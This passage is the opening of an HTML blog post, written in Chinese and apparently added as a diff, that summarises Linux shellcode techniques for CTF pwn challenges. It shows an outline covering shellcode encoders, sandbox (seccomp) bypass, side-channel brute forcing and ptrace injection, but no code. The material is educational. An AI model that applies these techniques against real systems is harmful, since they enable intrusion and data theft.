@@ -1,0 +1,1073 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Linux下的shellcode技巧总结 | roderick - record and learn!</title><meta name="author" content="roderick">
+<meta name="description" content=" 对shellcode知识点的一些总结。
+"><meta name="keywords" content='shellcode'>
+  <meta itemprop="name" content="Linux下的shellcode技巧总结">
+  <meta itemprop="description" content="对shellcode知识点的一些总结。">
+  <meta itemprop="datePublished" content="2023-02-20T22:51:44+08:00">
+  <meta itemprop="dateModified" content="2023-02-20T22:51:44+08:00">
+  <meta itemprop="wordCount" content="6078">
+  <meta itemprop="image" content="https://roderickchan.github.io/">
+  <meta itemprop="keywords" content="shellcode"><meta property="og:url" content="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/">
+  <meta property="og:site_name" content="roderick - record and learn!">
+  <meta property="og:title" content="Linux下的shellcode技巧总结">
+  <meta property="og:description" content="对shellcode知识点的一些总结。">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-02-20T22:51:44+08:00">
+    <meta property="article:modified_time" content="2023-02-20T22:51:44+08:00">
+    <meta property="article:tag" content="shellcode">
+    <meta property="article:tag" content="pwn">
+    <meta property="og:image" content="https://roderickchan.github.io/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://roderickchan.github.io/">
+  <meta name="twitter:title" content="Linux下的shellcode技巧总结">
+  <meta name="twitter:description" content="对shellcode知识点的一些总结。">
+<meta name="application-name" content="roderick - record and learn!">
+<meta name="apple-mobile-web-app-title" content="roderick - record and learn!"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#2d89ef"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#FF7359"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" type="text/html" href="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/" title="Linux下的shellcode技巧总结 | roderick - record and learn!" /><link rel="prev" type="text/html" href="https://roderickchan.github.io/zh-cn/2023-02-15-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAlibc-database/" title="自己搭建一个libc database" /><link rel="next" type="text/html" href="https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/" title="Glibc堆利用之house of系列总结" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Linux下的shellcode技巧总结",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/roderickchan.github.io\/zh-cn\/2023-02-20-the-art-of-shellcode\/"
+    },"image": ["https:\/\/roderickchan.github.io\/images\/apple-devices-preview.webp"],"genre": "posts","keywords": "shellcode, pwn","wordcount":  6078 ,
+    "url": "https:\/\/roderickchan.github.io\/zh-cn\/2023-02-20-the-art-of-shellcode\/","datePublished": "2023-02-20T22:51:44+08:00","dateModified": "2023-02-20T22:51:44+08:00","license": "本站内容采用 CC BY-NC-SA 4.0 国际许可协议。","publisher": {
+      "@type": "Organization",
+      "name": "roderick","logo": "https:\/\/roderickchan.github.io\/images\/avatar.png"},"author": {
+        "@type": "Person",
+        "name": "roderick"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper" data-github-corner="right">
+    <div class="header-title">
+      <a href="/zh-cn/" title="roderick - record and learn!"><img class="logo" src='/logo.png' alt="roderick - record and learn!" height="32" width="32"><span class="header-title-text">roderick&#39;s blog</span></a><span class="typeit header-subtitle"><template>To record and learn!</template></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 全部文章</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/collections/"><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden="true"></i> 合集</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/comment/"><i class="fa-regular fa-comments fa-fw fa-sm" aria-hidden="true"></i> 留言板</a></li><li class="menu-item">
+              <a class="menu-link" href="https://roderick:rode%40rick@download.roderickchan.cn/" title="我的资源下载中心" rel="noopener noreferrer" target="_blank"><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li><li class="menu-item language-switch">
+            <span role="button" aria-label="选择语言" title="选择语言"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+            <ul class="sub-menu"><li class="menu-item">没有更多翻译</li></ul>
+          </li><li class="menu-item language-switch auto d-none" aria-hidden="true">
+    <span role="button" aria-label="选择语言" title="选择语言"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+    <ul class="sub-menu"><li class="menu-item active" data-type="artificial">
+              <a href="/zh-cn/2023-02-20-the-art-of-shellcode/" data-lang="zh-CN" class="menu-link text-secondary" title="简体中文">
+                <i class="fa-solid fa-person fa-fw fa-sm" aria-hidden="true"></i> 简体中文</a>
+            </li><li class="menu-item-divider" aria-hidden="true"></li><li class="menu-item" data-type="machine">
+          <a data-lang="english" class="menu-link" title="English">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> English</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="french" class="menu-link" title="Français">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Français</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="russian" class="menu-link" title="Русский язык">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Русский язык</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="chinese_simplified" class="menu-link" title="简体中文">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 简体中文</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="hindi" class="menu-link" title="हिन्दी">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> हिन्दी</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="japanese" class="menu-link" title="日本語">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 日本語</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="chinese_traditional" class="menu-link" title="繁體中文">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 繁體中文</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="spanish" class="menu-link" title="Español">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Español</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="korean" class="menu-link" title="한국어">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 한국어</a>
+        </li></ul>
+  </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/zh-cn/" title="roderick - record and learn!"><img class="logo" src='/logo.png' alt="roderick - record and learn!" height="26" width="26"><span class="header-title-text">roderick&#39;s blog</span></a><span class="typeit header-subtitle"><template>To record and learn!</template></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/zh-cn/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 全部文章</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/collections/"><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden="true"></i> 合集</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/comment/"><i class="fa-regular fa-comments fa-fw fa-sm" aria-hidden="true"></i> 留言板</a></li><li class="menu-item"><a class="menu-link" href="https://roderick:rode%40rick@download.roderickchan.cn/" title="我的资源下载中心" rel="noopener noreferrer" target="_blank"><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item text-center"><a class="menu-link" href="https://github.com/RoderickChan" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
+              <span role="button" aria-label="选择语言" title="选择语言">简体中文<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+              <select class="language-select" onchange="location = this.value;"><option disabled>没有更多翻译</option></select>
+            </span><span id="translate" class="menu-system-item language-switch auto d-none" aria-hidden="true">
+    <span role="button" aria-label="选择语言" title="选择语言" data-current="简体中文">简体中文<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+  </span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/zh-cn/posts/" title="Posts">文章</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">Linux下的shellcode技巧总结</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"><div class="details related-details open">
+      <div class="details-summary related-summary">
+        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
+        <span class="related-title">相关内容</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
+      <div class="details-content related-content">
+        <ul class="related-list"><li class="related-item">
+              <a href="/zh-cn/2022-06-18-glibcheap-house-of-muney/" title="GlibcHeap-House of Muney">GlibcHeap-House of Muney</a></li><li class="related-item">
+              <a href="/zh-cn/2023-02-13-%E4%BD%BF%E7%94%A8docker%E8%B0%83%E8%AF%95pwn%E9%A2%98/" title="使用docker调试和部署pwn题">使用docker调试和部署pwn题</a></li><li class="related-item">
+              <a href="/zh-cn/2023-02-10-socat%E5%8F%8D%E5%BC%B9shell-tmux%E5%85%B1%E4%BA%AB%E4%BC%9A%E8%AF%9D/" title="Socat反弹shell&#43;tmux共享会话">Socat反弹shell&#43;tmux共享会话</a></li><li class="related-item">
+              <a href="/zh-cn/2023-02-10-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/" title="Pwn环境搭建脚本">Pwn环境搭建脚本</a></li><li class="related-item">
+              <a href="/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/" title="2023西湖论剑初赛pwn-Jit">2023西湖论剑初赛pwn-Jit</a></li></ul>
+      </div>
+    </div><div class="aside-custom"><img src="https://image.roderickchan.cn/img/roderick_wechat_official_account_white_in_green.png" height="104" width="372">
+
+</div></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Linux下的shellcode技巧总结</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://www.roderickchan.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&d=mp' alt="roderick" height="16" width="16">&nbsp;roderick</a></span><span class="post-included-in">&nbsp;收录于 <a href="/zh-cn/categories/pwn-trick/" class="post-category" title="分类 - pwn-trick"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> pwn-trick</a></span></div><div class="post-meta-line"><span title="发布于 2023-02-20 22:51:44"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-02-20">2023-02-20</time></span>&nbsp;<span title="6078 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 6100 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 13 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="Linux下的shellcode技巧总结"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-如何编写shellcode">1-如何编写shellcode</a>
+      <ul>
+        <li><a href="#1-1-纯手搓">1-1 纯手搓</a>
+          <ul>
+            <li><a href="#1-1-1-纯汇编">1-1-1 纯汇编</a></li>
+            <li><a href="#1-1-2-内联汇编">1-1-2 内联汇编</a></li>
+            <li><a href="#1-1-3-使用tiny_libc">1-1-3 使用tiny_libc</a></li>
+          </ul>
+        </li>
+        <li><a href="#1-2-借助工具">1-2 借助工具</a>
+          <ul>
+            <li><a href="#1-2-1-pwntools的shellcraft">1-2-1 pwntools的shellcraft</a></li>
+            <li><a href="#1-2-2-alpha3">1-2-2 alpha3</a></li>
+            <li><a href="#1-2-3-ae64">1-2-3 AE64</a></li>
+            <li><a href="#1-2-4-shellcode-encoder">1-2-4 shellcode encoder</a></li>
+            <li><a href="#1-2-5-msf生成">1-2-5 msf生成</a></li>
+          </ul>
+        </li>
+        <li><a href="#1-3-在线网站">1-3 在线网站</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-突破沙箱规则">2-突破沙箱规则</a>
+      <ul>
+        <li><a href="#2-1-使用atv2系统调用">2-1 使用at/v/2系统调用</a></li>
+        <li><a href="#2-2-使用orw读取flag">2-2 使用orw读取flag</a></li>
+        <li><a href="#2-3-切换指令模式">2-3 切换指令模式</a></li>
+        <li><a href="#2-4-使用0x40000000x系统调用">2-4 使用0x40000000+X系统调用</a></li>
+        <li><a href="#2-5-使用-io_uring-系统调用">2-5 使用 io_uring 系统调用</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-字符型shellcode">3-字符型shellcode</a>
+      <ul>
+        <li><a href="#3-1-可打印字符">3-1 可打印字符</a></li>
+        <li><a href="#3-2-字母和数字">3-2 字母和数字</a></li>
+        <li><a href="#3-3-限制字母和数字">3-3 限制字母和数字</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-shellcode编写技巧">4-shellcode编写技巧</a>
+      <ul>
+        <li><a href="#4-1-观察寄存器状态">4-1 观察寄存器状态</a></li>
+        <li><a href="#4-2-观察栈的状态">4-2 观察栈的状态</a></li>
+        <li><a href="#4-3-使用更短的指令">4-3 使用更短的指令</a></li>
+        <li><a href="#4-4-构造read再次读入">4-4 构造read再次读入</a></li>
+        <li><a href="#4-5-侧信道爆破内存">4-5 侧信道爆破内存</a></li>
+        <li><a href="#4-6-侧信道爆破flag">4-6 侧信道爆破flag</a></li>
+        <li><a href="#4-7-借助rax寄存器">4-7 借助rax寄存器</a></li>
+        <li><a href="#4-8-借助段寄存器">4-8 借助段寄存器</a></li>
+        <li><a href="#4-9-ptrace注入">4-9 ptrace注入</a></li>
+        <li><a href="#4-10-多架构通用shellcode">4-10 多架构通用shellcode</a></li>
+        <li><a href="#4-11-有限字符的shellcode">4-11 有限字符的shellcode</a></li>
+        <li><a href="#4-12-寄存器全为0的syscall">4-12 寄存器全为0的syscall</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><blockquote>
+<p>对<code>shellcode</code>知识点的一些总结。</p></blockquote>
+<meting-js server="netease" type="song" id="1455273374" theme="#448aff"></meting-js>
+<p>relax and learn&hellip;</p>
+<hr>
+<ul>
+<li><a href="#1-%e5%a6%82%e4%bd%95%e7%bc%96%e5%86%99shellcode">1-如何编写shellcode</a>
+<ul>
+<li><a href="#1-1-%e7%ba%af%e6%89%8b%e6%90%93">1-1 纯手搓</a>
+<ul>
+<li><a href="#1-1-1-%e7%ba%af%e6%b1%87%e7%bc%96">1-1-1 纯汇编</a></li>
+<li><a href="#1-1-2-%e5%86%85%e8%81%94%e6%b1%87%e7%bc%96">1-1-2 内联汇编</a></li>
+<li><a href="#1-1-3-%e4%bd%bf%e7%94%a8tiny_libc">1-1-3 使用tiny_libc</a></li>
+</ul>
+</li>
+<li><a href="#1-2-%e5%80%9f%e5%8a%a9%e5%b7%a5%e5%85%b7">1-2 借助工具</a>
+<ul>
+<li><a href="#1-2-1-pwntools%e7%9a%84shellcraft">1-2-1 pwntools的shellcraft</a></li>
+<li><a href="#1-2-2-alpha3">1-2-2 alpha3</a></li>
+<li><a href="#1-2-3-ae64">1-2-3 AE64</a></li>
+<li><a href="#1-2-4-shellcode-encoder">1-2-4 shellcode encoder</a></li>
+<li><a href="#1-2-5-msf%e7%94%9f%e6%88%90">1-2-5 msf生成</a></li>
+</ul>
+</li>
+<li><a href="#1-3-%e5%9c%a8%e7%ba%bf%e7%bd%91%e7%ab%99">1-3 在线网站</a></li>
+</ul>
+</li>
+<li><a href="#2-%e7%aa%81%e7%a0%b4%e6%b2%99%e7%ae%b1%e8%a7%84%e5%88%99">2-突破沙箱规则</a>
+<ul>
+<li><a href="#2-1-%e4%bd%bf%e7%94%a8atv2%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8">2-1 使用at/v/2系统调用</a></li>
+<li><a href="#2-2-%e4%bd%bf%e7%94%a8orw%e8%af%bb%e5%8f%96flag">2-2 使用orw读取flag</a></li>
+<li><a href="#2-3-%e5%88%87%e6%8d%a2%e6%8c%87%e4%bb%a4%e6%a8%a1%e5%bc%8f">2-3 切换指令模式</a></li>
+<li><a href="#2-4-%e4%bd%bf%e7%94%a80x40000000x%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8">2-4 使用0x40000000+X系统调用</a></li>
+<li><a href="#2-5-%e4%bd%bf%e7%94%a8-io_uring-%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8">2-5 使用 io_uring 系统调用</a></li>
+</ul>
+</li>
+<li><a href="#3-%e5%ad%97%e7%ac%a6%e5%9e%8bshellcode">3-字符型shellcode</a>
+<ul>
+<li><a href="#3-1-%e5%8f%af%e6%89%93%e5%8d%b0%e5%ad%97%e7%ac%a6">3-1 可打印字符</a></li>
+<li><a href="#3-2-%e5%ad%97%e6%af%8d%e5%92%8c%e6%95%b0%e5%ad%97">3-2 字母和数字</a></li>
+<li><a href="#3-3-%e9%99%90%e5%88%b6%e5%ad%97%e6%af%8d%e5%92%8c%e6%95%b0%e5%ad%97">3-3 限制字母和数字</a></li>
+</ul>
+</li>
+<li><a href="#4-shellcode%e7%bc%96%e5%86%99%e6%8a%80%e5%b7%a7">4-shellcode编写技巧</a>
+<ul>
+<li><a href="#4-1-%e8%a7%82%e5%af%9f%e5%af%84%e5%ad%98%e5%99%a8%e7%8a%b6%e6%80%81">4-1 观察寄存器状态</a></li>
+<li><a href="#4-2-%e8%a7%82%e5%af%9f%e6%a0%88%e7%9a%84%e7%8a%b6%e6%80%81">4-2 观察栈的状态</a></li>
+<li><a href="#4-3-%e4%bd%bf%e7%94%a8%e6%9b%b4%e7%9f%ad%e7%9a%84%e6%8c%87%e4%bb%a4">4-3 使用更短的指令</a></li>
+<li><a href="#4-4-%e6%9e%84%e9%80%a0read%e5%86%8d%e6%ac%a1%e8%af%bb%e5%85%a5">4-4 构造read再次读入</a></li>
+<li><a href="#4-5-%e4%be%a7%e4%bf%a1%e9%81%93%e7%88%86%e7%a0%b4%e5%86%85%e5%ad%98">4-5 侧信道爆破内存</a></li>
+<li><a href="#4-6-%e4%be%a7%e4%bf%a1%e9%81%93%e7%88%86%e7%a0%b4flag">4-6 侧信道爆破flag</a></li>
+<li><a href="#4-7-%e5%80%9f%e5%8a%a9rax%e5%af%84%e5%ad%98%e5%99%a8">4-7 借助rax寄存器</a></li>
+<li><a href="#4-8-%e5%80%9f%e5%8a%a9%e6%ae%b5%e5%af%84%e5%ad%98%e5%99%a8">4-8 借助段寄存器</a></li>
+<li><a href="#4-9-ptrace%e6%b3%a8%e5%85%a5">4-9 ptrace注入</a></li>
+<li><a href="#4-10-%e5%a4%9a%e6%9e%b6%e6%9e%84%e9%80%9a%e7%94%a8shellcode">4-10 多架构通用shellcode</a></li>
+<li><a href="#4-11-%e6%9c%89%e9%99%90%e5%ad%97%e7%ac%a6%e7%9a%84shellcode">4-11 有限字符的shellcode</a></li>
+<li><a href="#4-12-%e5%af%84%e5%ad%98%e5%99%a8%e5%85%a8%e4%b8%ba0%e7%9a%84syscall">4-12 寄存器全为0的syscall</a></li>
+</ul>
+</li>
+<li><a href="#%e5%8f%82%e8%80%83">参考</a></li>
+</ul>
+<hr>
+<ul>
+<li>本文尽可能地全面地总结有关<code>shellcode</code>的知识点。目前重点关注<code>linux</code>系统用户态的<code>x86</code>汇编指令。持续更新中&hellip;&hellip;</li>
+<li>本文只将现有有关<code>shellcode</code>的知识点提炼出来，没有做细致地解释与分析，不会涉及到具体的例题。若师傅们有疑问可以在评论中提出&hellip;&hellip;</li>
+</ul>
+<p>可以在<a href="https://www.bilibili.com/video/BV1mV4y1f7YK"target="_blank" rel="external nofollow noopener noreferrer">Bilibili<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>上观看视频进行学习：</p>
+<div class="bilibili">
+  <iframe src="//player.bilibili.com/player.html?bvid=BV1mV4y1f7YK&page=1&autoplay=false&poster=true&muted=false&danmaku=true&t=0" border="0" framespacing="0" allowfullscreen="true"></iframe>
+</div>
+<p>或者在<a href="https://www.youtube.com/watch?v=qVE5aaS9hF0"target="_blank" rel="external nofollow noopener noreferrer">Youtube<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>上观看视频进行学习：</p>
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube-nocookie.com/embed/qVE5aaS9hF0?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
+
+<hr>
+<h2 class="heading-element" id="1-如何编写shellcode"><span>1-如何编写shellcode</span>
+  <a href="#1-%e5%a6%82%e4%bd%95%e7%bc%96%e5%86%99shellcode" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>shellcode</code>是一段可被<code>CPU</code>直接执行的程序码。</p>
+<p>使用<code>shellcode</code>进行攻击是一项经典而强大的技术，借助<code>shellcode</code>几乎可以完成任何事情，包括但不限于泄露敏感信息、反弹<code>shell</code>、布置后门等。</p>
+<p>编写<code>shellcode</code>的方式有很多，而方式的选择取决于实际场景。如当需要编写复杂的<code>shellcode</code>的时候，需要手搓；当需要注入特定模板的<code>shellcode</code>时，可以采用工具生成；当需要观察<code>shellcode</code>的字符、长度时，可以采用在线网站生成。</p>
+<h2 class="heading-element" id="1-1-纯手搓"><span>1-1 纯手搓</span>
+  <a href="#1-1-%e7%ba%af%e6%89%8b%e6%90%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>学到最后，你会发现还是会回归到最原始的方式：手搓<code>shellcode</code>。</p>
+<h3 class="heading-element" id="1-1-1-纯汇编"><span>1-1-1 纯汇编</span>
+  <a href="#1-1-1-%e7%ba%af%e6%b1%87%e7%bc%96" class="heading-mark">
